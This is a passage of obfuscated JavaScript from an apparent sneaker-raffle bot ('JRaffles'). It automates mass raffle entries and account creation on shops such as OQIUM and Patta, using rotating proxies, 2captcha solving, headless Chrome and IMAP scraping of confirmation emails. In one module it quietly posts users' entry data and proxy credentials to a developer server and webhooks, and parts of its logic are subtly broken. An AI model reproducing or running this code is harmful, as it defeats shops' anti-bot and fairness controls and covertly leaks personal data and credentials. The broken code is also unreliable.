                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x2d5a9e, _0x254fc8, _0x2927f8) {
                    var _0x546e98 = _0x254fc8, _0x4d618e = 0x0;
                    for (var _0x22b03e = 0x0; _0x22b03e < _0x254fc8['length']; _0x22b03e++) {
                        maxTasks = _0x579cef['threads'];
                        while (_0x4d618e >= maxTasks) {
                            await _0xaebb71(_0x579cef['delay']);
                        }
                        async function _0x1d2383(_0x1b9f44, _0x19f5b5, _0x38b254, _0x4e95fc) {
                            try {
                                await _0x48a0b3(_0x19f5b5, _0x4e95fc);
                            } catch (_0x51ee2c) {
                                throw new Error(_0x51ee2c);
                            }
                            async function _0xe14bbd(_0x5a6536, _0x587282, _0x390c59, _0x41d7b1, _0x360c54) {
                                _0x4d618e++;
                                var _0x3dbf78, _0x227b8c = {}, _0x477bff = [], _0x14feae = {}, _0x1fefca = [
                                    '40',
                                    '40.5',
                                    '41',
                                    '42',
                                    '42.5',
                                    '43',
                                    '44',
                                    '45',
                                    '45.5',
                                    '46',
                                    '47',
                                    '47.5',
                                    '48'
                                ], _0x308c92 = Math['round'](Math['random']() * (_0x1fefca['length'] - 0x1));
                                !_0x41d7b1 && (_0x41d7b1 = {});
                                if (_0x587282 != 'ver') {
                                    _0x3e0125(_0x390c59['name'] + '\x20Task\x20' + (_0x5a6536 + 0x1) + '\x20/\x20' + _0x41d7b1['length'] + '\x20||\x20File:\x20' + _0x5d3bce + '\x20Proxies:\x20' + _0x2ffd47), _0x477bff = [{
                                        'type': 'rich',
                                        'title': 'Succesful\x20OQIUM\x20Entry',
                                        'description': '',
                                        'color': 0xc0d6d6,
                                        'fields': [
                                            {
                                                'name': 'User',
                                                'value': '' + _0x3f93ac
                                            },
                                            {
                                                'name': 'Size',
                                                'value': '' + _0x41d7b1[_0x5a6536]['Size']
                                            },
                                            {
                                                'name': 'Delay',
                                                'value': '' + _0x579cef['delay']
                                            },
                                            {
                                                'name': 'Version',
                                                'value': '' + _0x4a92ac
                                            }
                                        ]
                                    }], _0x14feae = { 'embeds': _0x477bff }, _0x227b8c = _0x390c59['data'], _0x227b8c['data']['attributes']['email'] = '' + _0x41d7b1[_0x5a6536]['Email'];
                                    if (_0x41d7b1[_0x5a6536]['Size'] == 'RANDOM') {
                                    }
                                    _0x227b8c['data']['attributes']['properties']['$first_name'] = '' + _0x41d7b1[_0x5a6536]['FirstName'], _0x227b8c['data']['attributes']['properties']['$last_name'] = '' + _0x41d7b1[_0x5a6536]['LastName'], _0x227b8c['data']['attributes']['properties']['$address1'] = _0x41d7b1[_0x5a6536]['Address1'] + '\x20' + _0x41d7b1[_0x5a6536]['Address2'] + '\x20' + _0x41d7b1[_0x5a6536]['HouseNumber'], _0x227b8c['data']['attributes']['properties']['$zip'] = '' + _0x41d7b1[_0x5a6536]['Zip'], _0x227b8c['data']['attributes']['properties']['$city'] = '' + _0x41d7b1[_0x5a6536]['City'], _0x227b8c['data']['attributes']['properties']['$country'] = '' + _0x41d7b1[_0x5a6536]['Country'], _0x41d7b1[_0x5a6536]['Size'] == 'RANDOM' ? _0x227b8c['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x1fefca[_0x308c92] : _0x227b8c['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x41d7b1[_0x5a6536]['Size'], _0x227b8c['data']['attributes']['properties']['$phone_number'] = '' + _0x41d7b1[_0x5a6536]['Phone'], _0x227b8c['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x41d7b1[_0x5a6536]['Follower'];
                                }
                                if (_0x579cef['useRandomProxy'] = ![])
                                    var _0x1afa5b = _0x360c54[_0x5a6536]['split'](':');
                                else
                                    var _0x5cc70b = Math['round'](Math['random']() * (_0x360c54['length'] - 0x1)), _0x1afa5b = _0x360c54[_0x5cc70b]['split'](':');
                                var _0x56e2ed = {
                                    'jar': _0x453a7b,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x390c59['url'],
                                    'headers': _0x390c59['headers'],
                                    'body': JSON['stringify'](_0x227b8c),
                                    'proxy': 'http://' + _0x1afa5b[0x2] + ':' + _0x1afa5b[0x3] + '@' + _0x1afa5b[0x0] + ':' + _0x1afa5b[0x1]
                                };
                                return _0x587282 != 'ver' && (_0x56e2ed['url'] = _0x390c59['url'], _0x56e2ed['headers'] = _0x390c59['headers']), _0x587282 == 'ver' && (_0x56e2ed['method'] = 'GET'), new Promise(function (_0x1e70d7, _0x48445c) {
                                    callback = async (_0x2ce9e0, _0x242a16, _0x54e9d7) => {
                                        if (!_0x2ce9e0 && _0x242a16['statusCode'] == 0xca || !_0x2ce9e0 && _0x242a16['statusCode'] == 0xc8) {
                                            if (_0x587282 != 'ver') {
                                                var _0x5a746d = await _0x3ead77(_0x41d7b1[_0x5a6536], _0x390c59, 'dev', ![]), _0x4f363c = await _0x3ead77(_0x41d7b1[_0x5a6536], _0x390c59, 'pub', ![]);
                                                const _0x57517f = {
                                                    'succesDEVMSG': { 'embeds': [_0x5a746d] },
                                                    'succesPUBMSG': { 'embeds': [_0x4f363c] }
                                                };
                                                let _0x20fc48 = _0x41d7b1[_0x5a6536];
                                                try {
                                                    prxdata = {
                                                        'username': _0x3f93ac['replace']('#', ''),
                                                        'module': _0x390c59['name'],
                                                        'entrydata': JSON['stringify'](_0x20fc48),
                                                        'proxy': '' + _0x360c54[_0x5a6536]
                                                    };
                                                    var _0x58be0b = JSON['stringify'](prxdata);
                                                    let _0x8ea159 = { 'headers': { 'content-type': 'application/json' } };
                                                    await _0x52d98a['post']('https://jraffles.herokuapp.com/success', _0x58be0b, _0x8ea159);
                                                } catch (_0x34ec3c) {
                                                }
                                                if (_0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '')
                                                    try {
                                                        await _0x4401f2(_0x579cef['webhook'], _0x57517f['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0xaebb71(0xc8), await _0x4401f2(_0x1f75ad, _0x57517f['succesDEVMSG']), await _0xaebb71(0xc8);
                                                try {
                                                    await _0x4401f2(_0x2aae93, _0x57517f['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x20f501(_0x41d7b1[_0x5a6536], _0x390c59);
                                            }
                                            _0x4d618e--, _0x1e70d7(console['log'](_0x218a39['green'](_0x11b348() + '\x20[' + _0x390c59['name'] + ']\x20Task\x20' + (_0x5a6536 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x587282 != 'ver') {
                                                var _0x4bb43b = '' + _0x2ce9e0, _0x25beb7 = await _0x3ead77(_0x41d7b1[_0x5a6536], _0x390c59, 'dev', !![], _0x4bb43b), _0x1f3c7b = {};
                                                _0x1f3c7b['errorDEV'] = { 'embeds': [_0x25beb7] }, _0x47d653(_0x41d7b1[_0x5a6536], _0x390c59), _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], _0x1f3c7b['errorDEV']), await _0x4401f2(_0x2631ac, _0x1f3c7b['errorDEV']);
                                            }
                                            _0x4d618e--, _0x48445c(console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x390c59['name'] + ']\x20Task\x20' + (_0x5a6536 + 0x1) + ':\x20' + _0x2ce9e0)));
                                        }
                                    };
                                    try {
                                        _0x587282 != 'ver' && console['log'](_0x11b348() + '\x20[' + _0x390c59['name'] + ']\x20Task\x20' + (_0x5a6536 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x227b8c['data']['attributes']['email']), _0x35490a(_0x56e2ed, callback);
                                    } catch (_0x172703) {
                                        console['log'](_0x11b348() + '\x20Task\x20' + (_0x5a6536 + 0x1) + ':\x20' + _0x172703);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0xe14bbd(_0x4e95fc, 'nor', _0x1b9f44, _0x19f5b5, _0x38b254), console['log'](_0x11b348() + '\x20[' + _0x1b9f44['name'] + ']\x20Sleeping\x20for\x20' + _0x579cef['delay'] + '\x20ms'), await _0xaebb71(_0x579cef['delay']);
                            } catch (_0x4e4c82) {
                            }
                        }
                        _0x1d2383(_0x2d5a9e, _0x546e98, _0x2927f8, _0x22b03e), await _0xaebb71(0x3e8);
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x5b2669, _0x244a1c, _0x417fcd) {
                    var _0x244a1c = [], _0x521d12 = ![];
                    async function _0x5d4b32() {
                        var _0x2f0890 = new _0x2b87aa({
                            'user': _0x579cef['masterMail'],
                            'password': _0x579cef['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x182ff9(_0x322936) {
                            _0x2f0890['openBox']('INBOX', ![], _0x322936);
                        }
                        _0x2f0890['once']('ready', function () {
                            _0x182ff9(function (_0x578b10, _0x2b75c6) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x578b10)
                                    throw _0x578b10;
                                _0x2f0890['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x29d94a, _0x71554c) {
                                    if (!_0x71554c || !_0x71554c['length'])
                                        console['log'](_0x11b348() + '\x20[' + _0x5b2669['name'] + ']\x20No\x20mails\x20found'), _0x2f0890['end']();
                                    else {
                                        var _0x1243e3 = _0x2f0890['seq']['fetch'](_0x71554c, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x1243e3['on']('message', function (_0x2efbca, _0x9c7ba) {
                                            var _0x31f3b3 = '(#' + _0x9c7ba + ')\x20';
                                            _0x2efbca['on']('body', function (_0x5af515, _0x35984a) {
                                                _0x554795(_0x5af515, (_0x2a0ce4, _0xfda02e) => {
                                                    var _0x4ad21e = _0xfda02e['text']['split']('(')[0x1], _0x2bf39f = _0x4ad21e['split'](')')[0x0];
                                                    _0x244a1c['push'](_0x2bf39f);
                                                });
                                            }), _0x2efbca['once']('end', function () {
                                            });
                                        }), _0x1243e3['once']('error', function (_0x370024) {
                                            console['log']('Fetch\x20error:\x20' + _0x370024), _0x521d12 = !![];
                                        }), _0x1243e3['once']('end', function () {
                                            _0x2f0890['end'](), _0x521d12 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x2f0890['once']('error', function (_0x4e0584) {
                            console['log'](_0x4e0584), _0x521d12 = !![];
                        }), _0x2f0890['once']('end', async function () {
                            _0x521d12 = !![];
                        }), _0x2f0890['connect']();
                    }
                    async function _0x72c6a8(_0x5b6d87, _0x232aa8, _0x5c4dbc) {
                        for (var _0x57e947 = 0x0; _0x57e947 < _0x232aa8['length']; _0x57e947++) {
                            async function _0x5b1f1a(_0xb1204e, _0x215530, _0x2fd02f, _0x437f4c, _0x18489c) {
                                var _0x22c3ea, _0x196d93 = {}, _0x4e093d = [], _0x224072 = {}, _0x188244 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x3224d4 = Math['round'](Math['random']() * (_0x188244['length'] - 0x1));
                                _0x437f4c[_0xb1204e]['Size'] == 'RANDOM' && (_0x437f4c[_0xb1204e]['Size'] = _0x188244[_0x3224d4]);
                                !_0x437f4c && (_0x437f4c = {});
                                if (_0x579cef['useRandomProxy'] = ![])
                                    var _0x55e634 = _0x18489c[_0xb1204e]['split'](':');
                                else
                                    var _0x5185c8 = Math['round'](Math['random']() * (_0x18489c['length'] - 0x1)), _0x55e634 = _0x18489c[_0x5185c8]['split'](':');
                                var _0x319181 = {
                                    'jar': _0x453a7b,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x2fd02f['url'],
                                    'headers': _0x2fd02f['headers'],
                                    'body': JSON['stringify'](_0x196d93),
                                    'proxy': 'http://' + _0x55e634[0x2] + ':' + _0x55e634[0x3] + '@' + _0x55e634[0x0] + ':' + _0x55e634[0x1]
                                };
                                return _0x215530 != 'ver' && (_0x319181['url'] = _0x2fd02f['url'], _0x319181['headers'] = _0x2fd02f['headers']), _0x215530 == 'ver' && (_0x319181['method'] = 'GET', _0x319181['url'] = _0x437f4c[_0xb1204e]), new Promise(function (_0x270f2b, _0x197922) {
                                    callback = async (_0x1084c5, _0x39e5b5, _0x5a5d93) => {
                                        if (!_0x1084c5 && _0x39e5b5['statusCode'] == 0xca || !_0x1084c5 && _0x39e5b5['statusCode'] == 0xc8) {
                                            if (_0x215530 != 'ver') {
                                                var _0x5e5049 = await _0x3ead77(_0x437f4c[_0xb1204e], _0x2fd02f, 'dev', ![]), _0x1c8c9c = await _0x3ead77(_0x437f4c[_0xb1204e], _0x2fd02f, 'pub', ![]);
                                                const _0x2898b6 = {
                                                    'succesDEVMSG': { 'embeds': [_0x5e5049] },
                                                    'succesPUBMSG': { 'embeds': [_0x1c8c9c] }
                                                };
                                                if (_0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '')
                                                    try {
                                                        await _0x4401f2(_0x579cef['webhook'], _0x2898b6['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0xaebb71(0xc8), await _0x4401f2(_0x1f75ad, _0x2898b6['succesDEVMSG']), await _0xaebb71(0xc8);
                                                try {
                                                    await _0x4401f2(_0x2aae93, _0x2898b6['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x20f501(_0x437f4c[_0xb1204e], _0x2fd02f);
                                            }
                                            _0x270f2b(console['log'](_0x218a39['green'](_0x11b348() + '\x20[' + _0x2fd02f['name'] + ']\x20Task\x20' + (_0xb1204e + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x215530 != 'ver') {
                                                var _0x1b6bb2 = '' + _0x1084c5, _0x3dfdd1 = await _0x3ead77(_0x437f4c[_0xb1204e], _0x2fd02f, 'dev', !![], _0x1b6bb2), _0x1afd86 = {};
                                                _0x1afd86['errorDEV'] = { 'embeds': [_0x3dfdd1] }, _0x47d653(_0x437f4c[_0xb1204e], _0x2fd02f), _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], _0x1afd86['errorDEV']), await _0x4401f2(_0x2631ac, _0x1afd86['errorDEV']);
                                            }
                                            _0x197922(console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x2fd02f['name'] + ']\x20Task\x20' + (_0xb1204e + 0x1) + ':\x20' + _0x1084c5)));
                                        }
                                    };
                                    try {
                                        _0x215530 != 'ver' ? console['log'](_0x11b348() + '\x20[' + _0x2fd02f['name'] + ']\x20Task\x20' + (_0xb1204e + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x196d93['data']['attributes']['email']) : console['log'](_0x11b348() + '\x20[' + _0x2fd02f['name'] + ']\x20Task\x20' + (_0xb1204e + 0x1) + ':\x20Fetching\x20Response'), _0x35490a(_0x319181, callback);
                                    } catch (_0x480b8f) {
                                        console['log'](_0x11b348() + '\x20Task\x20' + (_0xb1204e + 0x1) + ':\x20' + _0x480b8f);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x5b1f1a(_0x57e947, 'ver', _0x5b6d87, _0x232aa8, _0x5c4dbc), console['log'](_0x11b348() + '\x20[' + _0x5b6d87['name'] + ']\x20Sleeping\x20for\x20' + _0x579cef['delay'] + '\x20ms'), await _0xaebb71(_0x579cef['delay']);
                            } catch (_0x47427a) {
                            }
                        }
                    }
                    try {
                        _0x5d4b32();
                        while (!_0x521d12) {
                            await _0xaebb71(0xfa0);
                        }
                        console['log']('Found\x20' + _0x244a1c['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x72c6a8(_0x5b2669, _0x244a1c, _0x417fcd);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x22a660, _0x4c86cf, _0x81b593) {
                    _0x181ece['use'](_0x26fa28()), _0x181ece['use'](_0x2dba44({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x579cef['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1d4ddc = 0x0; _0x1d4ddc < _0x4c86cf['length']; _0x1d4ddc++) {
                        var _0x135d62 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x3f93ac
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x579cef['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x4a92ac
                                }
                            ]
                        }];
                        const _0x3826a9 = { 'embeds': _0x135d62 };
                        _0x3e0125(_0x22a660['name'] + '\x20Task\x20' + (_0x1d4ddc + 0x1) + '\x20/\x20' + _0x4c86cf['length'] + '\x20||\x20File:\x20' + _0x5d3bce + '\x20Proxies:\x20' + _0x2ffd47);
                        try {
                            await _0x48a0b3(_0x4c86cf, _0x1d4ddc);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x413fd1 = await _0x3ead77(_0x4c86cf[_0x1d4ddc], _0x22a660, 'acc', ![]);
                        const _0x4a0548 = { 'succesDEVMSG': { 'embeds': [_0x413fd1] } };
                        if (_0x4c86cf[_0x1d4ddc]['Email'] == '' || _0x4c86cf[_0x1d4ddc]['FirstName'] == '' || _0x4c86cf[_0x1d4ddc]['LastName'] == '') {
                            console['log'](_0x11b348() + '\x20[' + _0x5f903f[taskModule]['name'] + ']\x20Task\x20' + (_0x1d4ddc + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0xaebb71(0x7d0);
                            continue;
                        }
                        (_0x4c86cf[_0x1d4ddc]['Password'] == '' || _0x4c86cf[_0x1d4ddc] == undefined) && _0x4c86cf[_0x1d4ddc]['Password'] == 'JRaffles23!';
                        if (_0x579cef['useRandomProxy'] = ![])
                            var _0x46ab92 = _0x81b593[_0x1d4ddc]['split'](':');
                        else
                            var _0x119d86 = Math['round'](Math['random']() * (_0x81b593['length'] - 0x1)), _0x46ab92 = _0x81b593[_0x119d86]['split'](':');
                        var _0x11606f;
                        try {
                            _0x11606f = await _0x181ece['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x46ab92[0x0] + ':' + _0x46ab92[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x11606f = await _0x181ece['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x46ab92[0x0] + ':' + _0x46ab92[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x9ff9dd = await _0x11606f['newPage']();
                            await _0x9ff9dd['authenticate']({
                                'username': '' + _0x46ab92[0x2],
                                'password': '' + _0x46ab92[0x3]
                            }), console['log'](_0x11b348() + '\x20[' + _0x22a660['name'] + ']\x20Task\x20' + (_0x1d4ddc + 0x1) + '\x20:\x20Getting\x20Session'), await _0x9ff9dd['setRequestInterception'](!![]), _0x9ff9dd['on']('request', _0xe1556e => {
                                _0xe1556e['resourceType']() === 'image' || _0xe1556e['resourceType']() === 'font' || _0xe1556e['resourceType']() === 'media' ? _0xe1556e['abort']() : _0xe1556e['continue']();
                            }), await _0x9ff9dd['goto']('https://patta.nl/account/register'), await _0xaebb71(0xbb8), await _0x9ff9dd['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x11b348() + '\x20[' + _0x22a660['name'] + ']\x20Task\x20' + (_0x1d4ddc + 0x1) + '\x20:\x20Filling\x20information'), await _0x9ff9dd['type']('#RegisterForm-FirstName', '' + _0x4c86cf[_0x1d4ddc]['FirstName']), await _0xaebb71(0x226), await _0x9ff9dd['type']('#RegisterForm-LastName', '' + _0x4c86cf[_0x1d4ddc]['LastName']), await _0xaebb71(0x226), await _0x9ff9dd['type']('#RegisterForm-email', '' + _0x4c86cf[_0x1d4ddc]['Email']), await _0xaebb71(0x226), await _0x9ff9dd['type']('#RegisterForm-password', '' + _0x4c86cf[_0x1d4ddc]['Password']), await _0xaebb71(0x226), console['log'](_0x11b348() + '\x20[' + _0x22a660['name'] + ']\x20Task\x20' + (_0x1d4ddc + 0x1) + '\x20:\x20Submitting..'), await _0x9ff9dd['$eval']('#RegisterForm', _0x56d040 => _0x56d040['submit']()), await _0xaebb71(0x1f40);
                            try {
                                await _0x9ff9dd['waitForSelector']('.home-page-grid__collection'), await _0xaebb71(0x1f4), console['log'](_0x218a39['green'](_0x11b348() + '\x20[' + _0x22a660['name'] + ']\x20Task\x20' + (_0x1d4ddc + 0x1) + '\x20:\x20Account\x20' + _0x4c86cf[_0x1d4ddc]['Email'] + '\x20Generated!')), _0x4a3ff4['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x4c86cf[_0x1d4ddc]['Email'] + ',' + _0x4c86cf[_0x1d4ddc]['Password']), console['log'](_0x218a39['yellow'](_0x11b348() + '\x20[' + _0x22a660['name'] + ']\x20Task\x20' + (_0x1d4ddc + 0x1) + '\x20:\x20Account\x20' + _0x4c86cf[_0x1d4ddc]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x579cef['webhook'] != undefined && _0x579cef['webhook'] != '' && await _0x4401f2(_0x579cef['webhook'], _0x4a0548['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4401f2(_0x1acce0, _0x4a0548['succesDEVMSG']);
                            } catch (_0x581dac) {
                                console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x5f903f[taskModule]['name'] + ']\x20Task\x20' + (_0x1d4ddc + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x581dac));
                            }
                        } catch (_0x3ee192) {
                            console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x5f903f[taskModule]['name'] + ']\x20Task\x20' + (_0x1d4ddc + 0x1) + '\x20:\x20' + _0x3ee192));
                        } finally {
                            _0x11606f && _0x11606f['close'](), console['log']('Waiting\x20for\x20' + _0x579cef['delay'] + '\x20ms'), await _0xaebb71(_0x579cef['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x1864fa, _0x2cc90a, _0x634b43) {
                    _0x181ece['use'](_0x26fa28()), _0x181ece['use'](_0x2dba44({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x579cef['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x21366c = 0x0; _0x21366c < _0x2cc90a['length']; _0x21366c++) {
                        var _0x26422d;
                        if (_0xe3bf88 != 'yes')
                            var _0xe3bf88 = '', _0x3efbc8 = 0x0;
                        _0x3e0125(_0x1864fa['name'] + '\x20Task\x20' + (_0x21366c + 0x1) + '\x20/\x20' + _0x2cc90a['length'] + '\x20||\x20File:\x20' + _0x5d3bce + '\x20Proxies:\x20' + _0x2ffd47);
                        try {
                            await _0x48a0b3(_0x2cc90a, _0x21366c);
                        } catch {
                            _0xe3bf88 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x2cc90a[_0x21366c]['Email'] == '' || _0x2cc90a[_0x21366c]['Password'] == '' || _0x2cc90a[_0x21366c]['FirstName'] == '' || _0x2cc90a[_0x21366c]['LastName'] == '') {
                            console['log'](_0x11b348() + '\x20[' + _0x5f903f[taskModule]['name'] + ']\x20Task\x20' + (_0x21366c + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x579cef['useRandomProxy'] = ![])
                            var _0x41940e = _0x634b43[_0x21366c]['split'](':');
                        else
                            var _0x1b6d37 = Math['round'](Math['random']() * (_0x634b43['length'] - 0x1)), _0x41940e = _0x634b43[_0x1b6d37]['split'](':');
                        var _0x555769;
                        try {
                            _0x555769 = await _0x181ece['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x41940e[0x0] + ':' + _0x41940e[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x555769 = await _0x181ece['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x41940e[0x0] + ':' + _0x41940e[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x53b9a0 = await _0x555769['newPage']();
                            await _0x53b9a0['authenticate']({
                                'username': '' + _0x41940e[0x2],
                                'password': '' + _0x41940e[0x3]
                            }), console['log'](_0x11b348() + '\x20[' + _0x1864fa['name'] + ']\x20Task\x20' + (_0x21366c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x53b9a0['setRequestInterception'](!![]), _0x53b9a0['on']('request', _0x381176 => {
                                _0x381176['resourceType']() === 'image' || _0x381176['resourceType']() === 'font' || _0x381176['resourceType']() === 'media' ? _0x381176['abort']() : _0x381176['continue']();
                            }), await _0x53b9a0['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x53b9a0['waitForSelector']('#CustomerEmail'), console['log'](_0x11b348() + '\x20[' + _0x1864fa['name'] + ']\x20Task\x20' + (_0x21366c + 0x1) + '\x20:\x20Logging\x20in..'), await _0x53b9a0['type']('#CustomerEmail', '' + _0x2cc90a[_0x21366c]['Email']), await _0xaebb71(0x12c), await _0x53b9a0['type']('#CustomerPassword', '' + _0x2cc90a[_0x21366c]['Password']), await _0xaebb71(0x226), await _0x53b9a0['$eval']('#customer_login', _0x4fd52f => _0x4fd52f['submit']());
                            try {
                                await _0x53b9a0['waitForSelector']('#orders'), await _0xaebb71(0x4b0);
                            } catch {
                                console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x1864fa['name'] + ']\x20Task\x20' + (_0x21366c + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x53b9a0['goto']('' + _0x2cc90a[_0x21366c]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0xaebb71(0xbb8), console['log'](_0x11b348() + '\x20[' + _0x1864fa['name'] + ']\x20Task\x20' + (_0x21366c + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x53b9a0['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x218a39['red'](_0x11b348() + '\x20[' + _0x1864fa['name'] + ']\x20Task\x20' + (_0x21366c + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
